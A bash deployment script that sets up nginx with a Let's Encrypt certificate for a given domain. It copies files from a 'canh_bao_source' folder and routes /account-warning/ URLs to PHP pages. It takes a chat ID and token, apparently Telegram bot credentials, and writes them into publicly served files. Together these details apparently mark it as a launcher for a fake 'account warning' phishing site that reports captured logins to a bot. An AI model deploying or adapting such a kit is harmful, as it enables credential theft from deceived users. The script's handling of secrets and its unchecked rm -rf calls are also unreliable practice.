#!/bin/bash

# Check if domain parameter is provided
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <domain> <chatid> <token>"
    echo "Example: $0 example.com"
    exit 1
fi

DOMAIN=$1
WWW_DOMAIN="www.$DOMAIN"
CHAT_ID=$2
TOKEN=$3
NGINX_AVAILABLE="/etc/nginx/sites-available/$DOMAIN"
NGINX_ENABLED="/etc/nginx/sites-enabled/$DOMAIN"
WEB_ROOT="/var/www/html/$DOMAIN"

echo "Stopping Nginx..."
sudo systemctl stop nginx

# Install certbot if not installed
if ! command -v certbot &> /dev/null; then
    echo "Installing certbot..."
    sudo apt-get update
    sudo apt-get install -y certbot
fi

# check ssl certificate
if [ -d "/etc/letsencrypt/live/$DOMAIN" ]; then
    echo "SSL certificate already exists for $DOMAIN and $WWW_DOMAIN"
else
    # Get SSL certificate
    echo "Getting SSL certificate for $DOMAIN and $WWW_DOMAIN..."
    sudo certbot certonly --standalone -d $DOMAIN -d $WWW_DOMAIN
fi

# Create web root directory
echo "Creating web root directory..."
if [ ! -d "$WEB_ROOT" ]; then
    sudo mkdir -p $WEB_ROOT
    sudo chmod -R 755 $WEB_ROOT
else
    sudo rm -rf $WEB_ROOT
    sudo mkdir -p $WEB_ROOT
    sudo chmod -R 755 $WEB_ROOT
fi

# Copy source files if they exist
if [ -d "/var/www/html/canh_bao_source" ]; then
    echo "Copying source files..."
    sudo cp -r /var/www/html/canh_bao_source/* $WEB_ROOT 2>/dev/null || true
fi

# Update chat_id.txt and token.txt if parameters are provided
if [ ! -z "$CHAT_ID" ]; then
    echo "Updating chat_id.txt..."
    echo "$CHAT_ID" | sudo tee "$WEB_ROOT/chat-id.txt" > /dev/null
fi

if [ ! -z "$TOKEN" ]; then
    echo "Updating token.txt..."
    echo "$TOKEN" | sudo tee "$WEB_ROOT/token.txt" > /dev/null
fi

# check config file
if [ -f "$NGINX_AVAILABLE" ]; then
    rm -rf $NGINX_AVAILABLE
    rm -rf $NGINX_ENABLED
fi

# Create Nginx configuration
echo "Creating Nginx configuration..."
sudo tee $NGINX_AVAILABLE > /dev/null << EOF
server {
    listen 80;
    server_name $DOMAIN $WWW_DOMAIN;

    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl;
    server_name $DOMAIN $WWW_DOMAIN;

    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;

    root $WEB_ROOT;
    index index.html index.htm index.php;

    location ~ ^/account-warning/([^/]+)/([^/]+)/?$ {
        rewrite ^/account-warning/([^/]+)/([^/]+)/?$ /account-warning-page.php last;
    }

    location ~ ^/account-warning/([^/]+)/?$ {
       rewrite ^/account-warning/([^/]+)/?$ /account-warning.php last;
    }

    location / {
        try_files \$uri \$uri/ \$uri.php?\$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;
        include fastcgi_params;
    }
}
EOF

# Create symbolic link
echo "Creating symbolic link..."
sudo ln -sf $NGINX_AVAILABLE $NGINX_ENABLED

# Test Nginx configuration
echo "Testing Nginx configuration..."
sudo nginx -t

# Reload Nginx
echo "Reloading Nginx..."
sudo systemctl restart nginx

echo "Setup completed for $DOMAIN/account-warning/account-warning/account-warning!"

cat $WEB_ROOT/chat-id.txt
cat $WEB_ROOT/token.txt

echo "Please check if everything is working correctly"
